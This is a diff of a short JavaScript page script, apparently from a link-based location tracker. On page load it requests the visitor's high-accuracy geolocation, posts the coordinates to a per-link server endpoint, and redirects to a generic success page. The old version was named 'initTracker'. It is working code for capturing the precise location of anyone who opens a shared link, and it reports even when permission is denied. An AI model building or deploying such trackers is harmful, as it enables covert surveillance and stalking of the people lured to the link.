@@ -1,42 +1,35 @@
-function initTracker(linkId) {
-  var storedUsername = localStorage.getItem("username") || "Guest_" + Math.floor(1000 + Math.random() * 9000);
-  requestHighAccuracyLocation(storedUsername, linkId);
+function sendLocationPayload(latitudeValue, longitudeValue) {
+    fetch('/api/save-location/{{ link_id }}', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            username: 'Uknon',
+            latitude: latitudeValue,
+            longitude: longitudeValue
+        })
+    }).then(() => {
+        window.location.href = '/success';
+    });
 }
 
-function requestHighAccuracyLocation(username, linkId) {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      function (position) {
-        sendLocationData(linkId, username, position.coords.latitude, position.coords.longitude);
-      },
-      function (error) {
-        sendLocationData(linkId, username, null, null);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
-  } else {
-    sendLocationData(linkId, username, null, null);
-  }
+function requestUserLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (positionObject) => {
+                sendLocationPayload(positionObject.coords.latitude, positionObject.coords.longitude);
+            },
+            (errorObject) => {
+                sendLocationPayload(null, null);
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
+        );
+    } else {
+        sendLocationPayload(null, null);
+    }
 }
 
-function sendLocationData(linkId, username, latitude, longitude) {
-  fetch('/api/save-location/' + linkId, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      username: username,
-      latitude: latitude,
-      longitude: longitude
-    })
-  }).then(function () {
-    window.location.href = '/success';
-  }).catch(function () {
-    window.location.href = '/success';
-  });
-}
+window.onload = requestUserLocation;
